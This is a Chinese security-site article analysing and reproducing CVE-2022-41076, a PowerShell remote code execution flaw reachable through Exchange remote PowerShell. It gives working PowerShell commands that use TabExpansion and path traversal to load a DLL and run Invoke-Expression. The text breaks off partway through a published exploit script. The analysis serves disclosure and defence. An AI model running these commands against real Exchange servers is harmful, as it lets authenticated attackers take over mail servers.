---
title: PowerShell远程代码执行漏洞(CVE-2022-41076)分析与复现
url: https://www.4hou.com/posts/jJXl
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2023-02-18
fetch_date: 2025-10-04T07:21:35.347647
---

# PowerShell远程代码执行漏洞(CVE-2022-41076)分析与复现

PowerShell远程代码执行漏洞(CVE-2022-41076)分析与复现 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# PowerShell远程代码执行漏洞(CVE-2022-41076)分析与复现

盛邦安全
[漏洞](https://www.4hou.com/category/vulnerable)
2023-02-17 16:31:08

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)264089

收藏

导语：PowerShell远程代码执行漏洞(CVE-2022-41076)分析与复现

**漏洞概述**

PowerShell（包括Windows PowerShell和PowerShell Core）是微软公司开发的任务自动化和配置管理程序，最初只是一个 Windows 组件，由命令行 shell 和相关的脚本语言组成。后于2016年8月18日开源并提供跨平台支持。

PowerShell 命令称为 cmdlet（读作 command-let），可以用.NET 语言或 PowerShell 脚本语言本身来编写。PowerShell提供了运行空间功能，允许应用程序自定义运行空间，以限制可执行的自定义cmdlet。但在其会话中额外提供了可使用TabExpansion cmdlet，结合目录穿越可实现加载任意dll执行，导致攻击者可以执行原本不能执行的cmdlet，从而在目标机器上执行任意代码。

使用了PowerShell自定义运行空间的程序受此漏洞影响。比如Microsoft Exchange邮件服务程序通过此功能提供了远程PowerShell，以便远程管理Exchange邮件服务器，该远程PowerShell限制了危险的cmdlet和命令的执行。但是经过身份验证的远程攻击者可以在此远程PowerShell会话中利用该漏洞，在目标机器上执行任意代码。

**影响范围**

主流Windows操作系统（版本较多，可参考文末参考链接）、PowerShell 7.2和7.3

**复现环境**

服务器操作系统：Microsoft Windows Server 2012 R2 Standard 64位操作系统

服务器IP：192.168.220.162

攻击机操作系统：Win10 64位操作系统

Microsoft Exchange邮件服务程序版本：2016

分析工具：dnspy、procexp

**漏洞分析**

首先安装Microsoft Exchange Server 2016程序（需要先安装域，再安装Exchange，内存最好8G以上，以免出现各种异常，具体方法可参考文末参考链接），安装好后浏览器访问https://192.168.220.162/ecp，使用域管理员账号登录Exchange管理中心，添加测试账号。分析时使用的测试账号是新建的域普通用户账号，账号名：cve-user，密码为：4rfv5tgb.，以“现有用户”的方式新建用

户邮箱，如下图所示：

![图片1.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621848737183.png "1676621122166099.png")

在攻击机（可以不加入域，但要保证能通过域名访问到Exchange服务器）上打开powershell控制台，使用测试账号登录Exchange提供的远程PowerShell，登录脚本如下：

```
$User = "BeaconTowerLab\cve-user"
$Pass = ConvertTo-SecureString -AsPlainText "4rfv5tgb." -Force
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://WIN-EN5J2DQFIF3.BeaconTowerLab.local/powershell/ -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -AllowClobber
```

其中$User是新建的普通域用户账号，$Pass中的字符串“4rfv5tgb.”是域用户密码，$Session中的URI“http://WIN-EN5J2DQFIF3.BeaconTowerLab.local/powershell/”是Exchange提供的远程PowerShell访问链接，请注意这里是HTTP协议，域名是Exchange服务器的域名。登录成功后，就可以执行Exchange提供的PowerShell cmdlet管理邮件服务器。比如执行 Get-Mailbox cmdlet可以查看邮箱对象和属性，脚本如下：

Invoke-Command -Session $Session -ScriptBlock {get-mailbox}

![图片2.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621849219701.png "1676621220686831.png")

尝试执行其他cmdlet，比如“get-process”，试图获取Exchange服务器的进程列表，执行结果如下图所示：

![图片3.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621850152256.png "1676621236106377.png")

可以看到，get-process cmdlet不能被执行。说明Exchange提供的远程PowerShell限制了cmdlet，并不能执行任意cmdlet。被允许执行的cmdlet可以通过get-command来获取，执行结果如下图所示：

![图片4.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621850423074.png "1676621251143074.png")

这种受限制的PowerShell是由运行空间Runspace 技术实现的。使用dnspy反编译Exchange文件Microsoft.Exchange.PowerSharp.Management.dll，在类ExchangeManagementSessionFactory中，可以找到注册cmdlet代码实现的细节，如下图所示：

![图片5.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621851235727.png "1676621265429153.png")

在Exchange服务器上有多个w3wp.exe进程，分别处理不同的WEB请求。负责Exchange远程PowerShell登录、cmdlet执行的进程命令行参数中包含“MSExchangePowerShellAppPool”字符串，如下图所示：

![图片6.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621852137725.png "1676621279137450.png")

使用dnspy调试器附加上该进程，反编译系统模块System.Management.Automation.dll，在登录Exchange PowerShell时，将调用该文件包含的System.Management.Automation.Remoting.ServerRemoteSession类中的HandleCreateRunspacePool()函数。当传递参数WSManStackVersion < 3.0时，将注册额外的TabExpansion cmdlet，提供cmdlet补全功能，如下图所示：

![图片7.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621853171612.png "1676621295152174.png")

然后在登录成功后，可以执行TabExpansion cmdlet，补全“test”cmdlet的脚本如下：

Invoke-Command -Session $Session -ScriptBlock {TabExpansion -line "test" -lastWord "test"}

![图片8.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621853108243.png "1676621319806847.png")

在TabExpansion的实现代码中，使用“|;=”字符分割传入的参数，然后执行Get-Command cmdlet，如下图所示：

![图片9.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621854193070.png "1676621344188879.png")

此时Get-Command cmdlet在执行的时候，将执行系统模块System.Management.Automation.dll的System.Management.Automation.CommandDiscovery类中的LookupCommandInfo()函数，如下图所示：

![图片10.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621855207621.png "1676621359120433.png")

其中调用函数TryModuleAutoLoading()，其下再调用函数AutoloadSpecifiedModule()，最终执行Import-Module cmdlet加载对应的模块，如下图所示：

![图片11.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621855181469.png "1676621370175298.png")

比如执行如下脚本，可以实现加载NetTCPIP模块。

Invoke-Command -Session $Session -ScriptBlock { TabExpansion -line ";NetTCPIP\Test-NetConnection" -lastWord "-test" }

这样相当于执行cmdlet：Import-Module -Name NetTCPIP，如下图所示：

![图片12.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621856718988.png "1676621408552691.png")

Import-Module导入的模块文件可以是模块文件.psd1、PowerShell脚本文件.ps1和托管模块文件.dll。这样一来，配合路径穿越，可以实现加载PowerShell模块文件Microsoft.PowerShell.Commands.Utility.dll。脚本如下：

Invoke-Command -Session $Session -ScriptBlock { TabExpansion -line ";../../../../Windows/Microsoft.NET/assembly/GAC\_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0\_3.0.0.0\_\_31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression" -lastWord "-test" }

![图片13.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621857132213.png "1676621443195549.png")

PowerShell模块加载成功后，执行Invoke-Expression cmdlet可实现执行任意命令，突破了原来使用运行空间Runspace 创建的PowerShell cmdlet限制。比如获取当前用户名的脚本如下：

Invoke-Command $session {Microsoft.PowerShell.Commands.Utility\Invoke-Expression "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name" }

![图片14.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230217/1676621857649782.png "1676621467212841.png")

**利用场景**

从漏洞分析结果可知，使用了PowerShell自定义运行空间的程序受此漏洞影响，可实现任意代码执行。根据网络上公开的消息，Exchange和Skype Business使用了该技术，可以利用该漏洞，实现远程代码执行，接管服务器。针对Exchange程序，需要以下信息，才能利用该漏洞：

1. 一个能成功登录的邮箱账号和密码

2. 远程PowerShell管理中心可通过账号密码访问

3. 操作系统版本或者PowerShell版本在漏洞范围内

**漏洞复现**

漏洞分析中已经包含了Exchange的安装说明和注意事项，不再赘述。根据网上已公开的漏洞利用代码，这里再做归纳和说明。利用漏洞，获取当前用户名的脚本如下：

```
$secureString = ConvertTo-SecureString -String "4rfv5tgb." -AsPlainText -Force
$UserCredential = New-Object System.Management.Automation.PSCredential -ArgumentList "BeaconTowerLab\cve-user", $secureString
$version = New-Object -TypeName System.Version -ArgumentList "2.0"
$mytable = $PSversionTable
$mytable["WSManStackVersion"] = $version
$sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -ApplicationArguments
@{PSve...